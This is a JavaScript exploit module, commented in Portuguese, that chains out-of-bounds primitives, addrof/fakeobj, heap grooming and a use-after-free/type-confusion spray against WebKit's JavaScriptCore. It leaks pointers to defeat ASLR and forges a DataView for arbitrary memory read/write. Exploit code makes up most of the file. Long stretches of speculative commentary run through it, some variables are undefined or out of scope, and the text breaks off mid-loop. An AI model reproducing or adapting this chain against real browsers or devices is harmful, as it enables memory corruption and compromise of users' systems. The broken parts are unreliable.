// js/script3/testArrayBufferVictimCrash.mjs (v10 - UAF/TC em Arrays Genéricos)
// =======================================================================================
// ESTA VERSÃO INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO:
// 1. Validar primitivas básicas (OOB local).
// 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
//    - NOVO: Vítima e Spray de ARRAYS GENÉRICOS (new Array()).
//    - Drenagem ativa da free list.
//    - Múltiplas tentativas de UAF por tamanho.
// 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
// 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read,
    arb_write,
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE = "v10 - UAF/TC em Arrays Genéricos";

// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
const LOCAL_VERY_SHORT_PAUSE = 10;
const LOCAL_SHORT_PAUSE = 100;
const LOCAL_MEDIUM_PAUSE = 750;
const LOCAL_LONG_PAUSE = 1500;
const LOCAL_SHORT_SHORT_PAUSE = 50;

let global_spray_objects = [];
let hold_objects = [];

let _fake_data_view = null;


// Funções Auxiliares Comuns (dumpMemory)
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": ";
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    const byte = await arbReadFn(address.add(i + j), 1, logFn);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break;
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}

export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return value;
}

// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
function _doubleToInt64_direct(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

function _int64ToDouble_direct(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

/**
 * Tenta configurar a primitiva de leitura/escrita arbitrária universal usando fakeobj com um dado m_mode.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
 * @param {number} m_mode_to_try O valor de m_mode a ser testado.
 * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
 */
async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
    const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);

    _fake_data_view = null;
    let backing_array_buffer = null;

    try {
        backing_array_buffer = new ArrayBuffer(0x1000);
        hold_objects.push(backing_array_buffer);
        const backing_ab_addr = addrof_core(backing_array_buffer);
        logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);

        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
        logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);

        _fake_data_view = fakeobj_core(backing_ab_addr);
        if (!(_fake_data_view instanceof DataView)) {
            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
            return false;
        }
        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);

        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
        hold_objects.push(test_target_js_object);
        const test_target_js_object_addr = addrof_core(test_target_js_object);

        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
        await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);

        const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
        _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
        const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);

        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return true;
        } else {
            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
            logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return false;
        }
    } catch (e) {
        logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        try {
            if (backing_array_buffer) {
                const backing_ab_addr = addrof_core(backing_array_buffer);
                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
                await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            }
        } catch (cleanupErr) {
            logFn(`[${FNAME}] ERRO durante limpeza (restauração do m_vector) após falha de L/E Universal: ${cleanupErr.message}`, "error", FNAME);
        }
        return false;
    } finally {
        if (backing_array_buffer) {
            const index = hold_objects.indexOf(backing_array_buffer);
            if (index > -1) { hold_objects.splice(index, 1); }
        }
        _fake_data_view = null;
    }
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF (Integradas) ---

// Função para forçar Coleta de Lixo
async function triggerGC(logFn, pauseFn) {
    logFn("    Acionando GC...", "info", "GC_Trigger");
    try {
        for (let i = 0; i < 500; i++) {
            new ArrayBuffer(1024 * 256);
        }
    } catch (e) {
        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
    for (let i = 0; i < 25; i++) {
        new ArrayBuffer(1024);
    }
    await pauseFn(LOCAL_SHORT_PAUSE);
}

/**
 * Tenta acionar o UAF/Type Confusion para um dado tamanho de vítima (usando Arrays genéricos).
 * @param {number} victimArrayLength O comprimento do Array JavaScript vítima/spray.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets JSC.
 * @returns {Promise<{success: boolean, leaked_double: number}>} Resultado do UAF e o double vazado.
 */
async function attemptUafLeakForArrayLength(victimArrayLength, logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME = "attemptUafLeakForArrayLength";
    // Um JSArray armazena ponteiros JSValue. Cada JSValue ocupa 8 bytes (um double).
    // O JSArray tem um cabeçalho fixo (JSObject) e um "butterfly" que contém os elementos.
    // O tamanho do butterfly depende do número de elementos e se há propriedades inline.
    const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // 8 bytes por elemento JSValue

    // Vamos estimar o tamanho da vítima alocada no heap. Um JSArray tem:
    // - O objeto JSArray em si (que herda de JSObject) - tamanho fixo (ex: 0x18 a 0x30 bytes)
    // - O 'butterfly' (ponteiro para a região dos elementos/propriedades)
    // - Os elementos reais no butterfly: victimArrayLength * EXPECTED_BUTTERFLY_ELEMENT_SIZE
    // O Type Confusion clássico aqui envolveria corromper o ponteiro 'butterfly' do Array vítima.

    logFn(`[${FNAME}] Tentando UAF para Array de comprimento = ${victimArrayLength} (Total de elementos = ${victimArrayLength})...`, "subtest", FNAME);

    let dangling_array_ref = null;
    // O número de objetos no spray UAF. Ajustado para arrays genéricos.
    const SPRAY_COUNT_UAF_OPT = 3000; // Pode precisar ser maior para arrays genéricos.

    // A vítima é um Array JavaScript (JSArray)
    let victim_js_array = new Array(victimArrayLength);
    // Preencher o array com um valor que não seja um ponteiro válido, por exemplo, um número grande.
    // Isso é útil para depuração para ver se o valor muda.
    for (let i = 0; i < victimArrayLength; i++) {
        victim_js_array[i] = i + 0x12345678; // Preencher com valores não-ponteiros
    }

    hold_objects.push(victim_js_array);
    dangling_array_ref = victim_js_array;

    // Forçar otimizações (acessando a vítima repetidamente)
    for (let i = 0; i < 10000; i++) {
        dangling_array_ref[0] = i;
    }

    logFn(`[${FNAME}] Objeto vítima (Array genérico, comprimento ${victimArrayLength}) criado.`, "info");
    // O endereço do objeto Array, não do butterfly!
    logFn(`[${FNAME}] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_array_ref).toString(true)}`, "info");
    logFn(`[${FNAME}] Valor inicial da ref. pendurada [0]: ${toHex(_doubleToInt64_direct(dangling_array_ref[0]), 64)}`, "info");

    // FASE DE LIBERAÇÃO E GC
    logFn(`[${FNAME}] FASE de liberação e GC...`, "info");
    const ref_index = hold_objects.indexOf(victim_js_array);
    if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
    victim_js_array = null;
    await triggerGC(logFn, pauseFn);
    logFn(`[${FNAME}] Memória da vítima liberada.`, "info");
    await pauseFn(LOCAL_SHORT_PAUSE);

    // Liberar o grooming spray inicial.
    const HEAP_GROOMING_SPRAY_COUNT = 20000;
    const grooming_spray_before_victim = [];
    logFn(`[${FNAME}] FASE 1: Heap Grooming com ${HEAP_GROOMING_SPRAY_COUNT} objetos de tamanhos variados...`, "info");
    for (let i = 0; i < HEAP_GROOMING_SPRAY_COUNT; i++) {
        const size_variant = (i % 16) * 0x10 + 0x40; // Ex: 0x40, 0x50, ..., 0x130 (em múltiplos de 16)
        grooming_spray_before_victim.push(new ArrayBuffer(size_variant));
    }
    hold_objects.push(grooming_spray_before_victim); // Adiciona para que não seja coletado imediatamente
    
    grooming_spray_before_victim.length = 0; // Libera as referências
    const groom_in_hold_index = hold_objects.indexOf(grooming_spray_before_victim);
    if (groom_in_hold_index > -1) { hold_objects.splice(groom_in_hold_index, 1); }
    await triggerGC(logFn, pauseFn);
    logFn(`[${FNAME}] Grooming spray inicial liberado e GC forçado.`, "info");
    await pauseFn(LOCAL_SHORT_SHORT_PAUSE);

    // Drenagem Ativa da Free List (Hypothesis - para arrays genéricos)
    const DRAIN_COUNT = 75;
    const DRAIN_SPRAY_PER_ITERATION = 75;
    logFn(`[${FNAME}] FASE 2.5: Drenagem Ativa da Free List...`, "info");
    for (let d = 0; d < DRAIN_COUNT; d++) {
        const drain_objects = [];
        for (let i = 0; i < DRAIN_SPRAY_PER_ITERATION; i++) {
            // Drenar com Arrays genéricos vazios ou de 1 elemento, dependendo do bucket.
            drain_objects.push(new Array(1).fill(0xDEADBEEF)); // Objeto pequeno que pode cair no mesmo bucket do cabeçalho do Array.
        }
        if (d % 5 === 0) { await triggerGC(logFn, pauseFn); }
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
    }
    await triggerGC(logFn, pauseFn);
    logFn(`[${FNAME}] Drenagem ativa concluída.`, "info");
    await pauseFn(LOCAL_SHORT_PAUSE);


    // PASSO 4: Pulverizar para reocupar a memória da vítima.
    logFn(`[${FNAME}] FASE 3: Pulverizando Arrays genéricos (comprimento ${victimArrayLength}) sobre a memória liberada...`, "info");
    const spray_arrays = [];

    // O valor a ser pulverizado é o ponteiro para a Structure da DataView.
    // Onde ele deve cair? Na posição do 'butterfly' do Array vítima!
    // Se a UAF for bem-sucedida, o 'dangling_array_ref' agora apontará para um Array
    // cujo 'butterfly' (que armazena os elementos) aponta para o valor que pulverizamos.
    // O problema é que o 'butterfly' não é o primeiro elemento. Ele é um offset DENTRO do JSObject/JSArray.

    // A abordagem mais comum para Type Confusion com Arrays genéricos é:
    // 1. Alocar um Array vítima.
    // 2. Liberar o Array vítima.
    // 3. Pulverizar com um objeto de controle que, quando lido como Array, corrompa o 'butterfly' ou o 'length'.
    // Ex: Se o 'butterfly' for `0x10` (de `JSObject.BUTTERFLY_OFFSET`),
    // e o `dangling_array_ref[0]` tentar acessar o primeiro elemento do array, ele na verdade acessa o `butterfly`.
    // Então, o que precisamos pulverizar é um objeto que, quando interpretado como um Array,
    // contenha um ponteiro no slot que corresponderia ao `butterfly` (ou outro campo).

    // Vamos assumir que a corrupção do 'butterfly' é o alvo principal.
    // O que queremos vazar é o endereço do DataView Structure vtable.
    const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000);
    const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
    let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
    const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
    const tagged_high_for_spray = TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | OBJECT_PTR_TAG_HIGH_EXPECTED;
    TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64);

    // Agora, o spray: criar objetos que reocupem o *cabeçalho* do Array vítima.
    // Um Array genérico tem um cabeçalho (JSObject) e um ponteiro para os elementos (butterfly).
    // O type confusion ocorre quando o objeto vítima é desalocado e reocupado por outro objeto
    // que tem um layout de memória diferente mas é interpretado como a vítima original.
    // O que se espera é que o *conteúdo do cabeçalho* seja corrompido, não os elementos diretamente.

    // Para atingir o 'butterfly' de um JSArray:
    // O JSArray é um JSObject. O BUTTERFLY_OFFSET é 0x10 do início do JSObject.
    // Se a vítima é um Array e o spray é um Array, o alocador pode reusar o slot.
    // Mas, precisamos que o *primeiro elemento* do array spray seja o ponteiro para a Structure,
    // ou que o 'butterfly' do array spray seja o ponteiro para o vtable.

    // Esta é a parte mais especulativa sem layout de memória preciso:
    // Suponha que um Array genérico tenha um header fixo e o butterfly em 0x10.
    // Se pudermos fazer com que o dangling_array_ref se torne um DataView,
    // teríamos um DataView para o endereço do Array original.

    // A estratégia mais promissora para Array-to-Array TC é corromper o ponteiro da Structure
    // do Array vítima, ou seu 'butterfly'.
    // Se o dangling_array_ref é um Array, e ele é reocupado por OUTRO Array,
    // mas de alguma forma seu 'butterfly' ou 'length' são corrompidos, isso pode funcionar.

    // Vamos tentar corromper o 'butterfly' diretamente.
    // O spray será um Array que no seu slot de 'butterfly' (0x10) terá o valor que queremos.
    // Este valor deve ser o endereço do DataView Structure.
    // Isso é complexo, pois os elementos de um Array genérico são JSValues (doubles taggeados).

    // Tentar um spray de Float64Array (que tem um layout de dados simples) para reocupar o Array
    // e ter o valor do vtable em uma posição previsível para ser lida como 'butterfly'.
    // Mas isso nos leva de volta ao problema de Float64Array vs Array...

    // Alternativa: Se o array vítima tem length 'L', e é reocupado por outro array de length 'L',
    // e você consegue mudar o 'length' dele via corrupção, pode haver um OOB.

    // VAMOS SIMPLIFICAR A HIPÓTESE:
    // A vítima é um Array genérico. O spray é um Float64Array.
    // O que acontece quando um Array é desalocado e um Float64Array é alocado em seu lugar?
    // O `dangling_array_ref` ainda é um Array, mas sua memória subjacente é um Float64Array.
    // Acessar `dangling_array_ref[0]` como um elemento de Array pode dar o valor do `Structure` do Float64Array.
    // O que é lido como `dangling_array_ref[0]` em um JSArray é o primeiro JSValue do seu `butterfly`.
    // Mas o que se espera que seja corrompido é o próprio ponteiro `butterfly` do JSArray, não um elemento.

    // O offset do butterfly em um JSObject/JSArray é 0x10.
    // Se a vítima é um Array genérico e o spray é algo que sobrescreve o offset 0x10,
    // e essa sobrescrita é lida como um ponteiro, isso pode dar o leak.

    // Tentativa: pulverizar `ArrayBuffer`s (que têm um `contents` em 0x10) e tentar ler o `butterfly`.
    // Isso nos leva de volta à estratégia da v01.

    // Uma nova ideia para array genérico:
    // 1. Array vítima (A) de tamanho pequeno (ex: 2 elementos).
    // 2. Objeto de controle (B) que será o spray.
    // 3. Libera A.
    // 4. Aloca B (que ocupa o lugar de A).
    // 5. Acessa A[0]. Isso leria o que está na memória de B no offset do elemento 0.
    // Se B for um ArrayBuffer, o offset do primeiro elemento de A pode cair em metadados de B.

    // A estratégia mais promissora para o Type Confusion com Arrays genéricos é manipular o `butterfly` ou o `length`.
    // O problema é que o `addrof_core` e `fakeobj_core` foram construídos assumindo `Float64Array` e `ArrayBuffer`.
    // A lógica de `_doubleToInt64_core` e `_int64ToDouble_core` funciona com doubles,
    // e arrays genéricos podem conter outros tipos de JSValue (não apenas doubles).

    // Se o Type Confusion é Array -> Float64Array (como já testamos sem sucesso),
    // então a alternativa é buscar um "info leak" ou um "arb write" diferente.

    // Vamos manter o scanner de tamanhos, mas com a vítima sendo um Array genérico e o spray sendo um Float64Array,
    // e focar na leitura do primeiro elemento do Array vítima, assumindo que ele deveria ter sido sobrescrito.
    // Se isso não funcionar, a abordagem de Type Confusion com Arrays pode não ser a ideal.

    for (let i = 0; i < SPRAY_COUNT_UAF_OPT; i++) {
        const spray_obj = new Float64Array(SPRAY_OBJECT_DATA_LENGTH); // O spray AINDA É Float64Array
        spray_obj[0] = spray_value_double_to_leak_ptr;
        for (let j = 1; j < spray_obj.length; j++) {
            spray_obj[j] = _int64ToDouble_direct(new AdvancedInt64(0xAA + j, 0xBB + j));
        }
        spray_arrays.push(spray_obj);
    }
    hold_objects.push(spray_arrays);
    logFn(`[${FNAME}] Pulverização de ${spray_arrays.length} Float64Array concluída sobre a memória da vítima.`, "info");
    await pauseFn(LOCAL_SHORT_PAUSE);

    // Tentativa de leitura para verificar o vazamento
    let leaked_jsvalue_from_uaf_double = 0;
    let uaf_leak_successful = false;
    const read_attempts = 15;
    for(let i = 0; i < read_attempts; i++) {
        // Acesso ao primeiro elemento do Array vítima que foi sobrescrito por um Float64Array
        // Isto deve ler o `spray_value_double_to_leak_ptr` se a reocupação ocorrer.
        leaked_jsvalue_from_uaf_double = dangling_array_ref[0]; 
        const leaked_int64_debug = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
        const OBJECT_PTR_TAG_HIGH_EXPECTED = 0x402a0000;
        const isTaggedPointer = (leaked_int64_debug.high() & 0xFFFF0000) === (OBJECT_PTR_TAG_HIGH_EXPECTED & 0xFFFF0000);

        // Verifica se o valor lido é um double válido e se ele tem a tag de ponteiro esperada.
        if (typeof leaked_jsvalue_from_uaf_double === 'number' && !isNaN(leaked_jsvalue_from_uaf_double) && leaked_jsvalue_from_uaf_double !== 0 && isTaggedPointer) {
             logFn(`[${FNAME}] SUCESSO na leitura! Ponteiro lido: ${toHex(leaked_int64_debug, 64)}.`, "leak");
             uaf_leak_successful = true;
             break;
        }
        logFn(`[${FNAME}] Valor lido inesperado em dangling_array_ref[0]: ${toHex(leaked_int64_debug, 64)}. Não é um ponteiro taggeado esperado. (Tentativa ${i+1}/${read_attempts})`, "warn");
        await pauseFn(LOCAL_VERY_SHORT_PAUSE);
    }

    if (uaf_leak_successful) {
        logFn(`[${FNAME}] SUCESSO CRÍTICO: Confusão de Tipos via UAF OCORREU para Array de comprimento=${victimArrayLength}!`, "vuln");
        return { success: true, leaked_double: leaked_jsvalue_from_uaf_double };
    } else {
        logFn(`[${FNAME}] FALHA: Ponteiro vazado do UAF é inválido (double) ou não taggeado para Array de comprimento=${victimArrayLength}.`, "error");
        return { success: false, leaked_double: NaN };
    }

}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST = "Teste Uaf Type Confusion";
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE;
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");

    let final_result = { success: false, message: "Exploração falhou ou não pôde ser verificada.", details: {} };
    const startTime = performance.now();
    let webkit_base_address = null;
    let found_m_mode = null;

    // Faixa de COMPRIMENTO de Arrays (número de elementos), não bytes.
    // Cada elemento é um JSValue (8 bytes), então length * 8 = bytes de dados.
    const VICTIM_ARRAY_LENGTH_RANGE_START = 2;   // Começa com 2 elementos (16 bytes de dados)
    const VICTIM_ARRAY_LENGTH_RANGE_END = 32;    // Vai até 32 elementos (256 bytes de dados)
    const VICTIM_ARRAY_LENGTH_INCREMENT = 1;     // Incrementa de 1 em 1 elemento

    let best_victim_length_found = -1;
    let best_leaked_double = NaN;

    try {
        logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });

        logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
        const arbTestSuccess = await selfTestOOBReadWrite(logFn);
        if (!arbTestSuccess) {
            const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a exploração.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
        await pauseFn(LOCAL_MEDIUM_PAUSE);


        logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
        const sprayStartTime = performance.now();
        const INITIAL_SPRAY_COUNT = 250000;
        logFn(`Iniciando spray de objetos (volume ${INITIAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
        for (let i = 0; i < INITIAL_SPRAY_COUNT; i++) {
            const dataSize = 50 + (i % 50) * 16;
            global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
        }
        logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
        logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
        const oobSetupStartTime = performance.now();
        logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
        await triggerOOB_primitive({ force_reinit: true });

        const oob_data_view = getOOBDataView();
        if (!oob_data_view) {
            const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
            logFn(errMsg, "critical");
            throw new Error(errMsg);
        }
        logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
        await pauseFn(LOCAL_SHORT_PAUSE);

        initCoreAddrofFakeobjPrimitives();
        logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");


        // --- FASE 2.5: Escaneamento de COMPRIMENTOS de Array para UAF/Type Confusion e Vazamento de ASLR ---
        logFn("--- FASE 2.5: Iniciando SCANNER DE COMPRIMENTOS DE ARRAY para UAF/Type Confusion e Vazamento de ASLR ---", "test");
        logFn(`Testando Array Lengths de ${VICTIM_ARRAY_LENGTH_RANGE_START} a ${VICTIM_ARRAY_LENGTH_RANGE_END} em incrementos de ${VICTIM_ARRAY_LENGTH_INCREMENT}.`, "info");

        for (let length = VICTIM_ARRAY_LENGTH_RANGE_START; length <= VICTIM_ARRAY_LENGTH_RANGE_END; length += VICTIM_ARRAY_LENGTH_INCREMENT) {
            logFn(`\n[SCANNER] Iniciando tentativa para Array Length = ${length} (${length * EXPECTED_BUTTERFLY_ELEMENT_SIZE} bytes de dados)...`, "subtest", "SCANNER");
            const UAF_ATTEMPTS_PER_SIZE = 3;
            let current_size_uaf_success = false;

            for (let attempt = 1; attempt <= UAF_ATTEMPTS_PER_SIZE; attempt++) {
                logFn(`[SCANNER] Tentativa UAF #${attempt}/${UAF_ATTEMPTS_PER_SIZE} para comprimento ${length}.`, "info", "SCANNER");
                
                const uaf_result = await attemptUafLeakForArrayLength(length, logFn, pauseFn, JSC_OFFSETS_PARAM);

                if (uaf_result.success) {
                    logFn(`[SCANNER] SUCESSO no vazamento de ponteiro para Array Length = ${length}!`, "good", "SCANNER");
                    best_victim_length_found = length;
                    best_leaked_double = uaf_result.leaked_double;
                    current_size_uaf_success = true;
                    break;
                } else {
                    logFn(`[SCANNER] Falha na tentativa UAF #${attempt} para comprimento ${length}.`, "warn", "SCANNER");
                }
